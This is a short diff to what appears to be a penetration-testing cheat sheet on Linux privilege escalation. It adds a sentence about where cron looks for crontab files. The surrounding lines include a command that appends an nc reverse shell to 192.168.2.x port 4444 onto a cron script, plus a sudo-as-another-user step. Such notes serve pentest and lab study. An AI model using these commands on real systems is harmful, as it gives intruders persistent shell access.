@@ -159,6 +159,7 @@ sudo -u user /bin/bash /var/www/html/start.sh
 ```
 ### Escalate by adding nc to cron job
 ```
+ The cron service searches its spool area (usually /var/spool/cron/crontabs) for crontab files (which are named after user accounts); cron also reads /etc/crontab, 
 echo "nc 192.168.2.x 4444 -e /bin/bash" >> /var/cron/check.sh
 ```
 ### Escalate by checking sudo -l
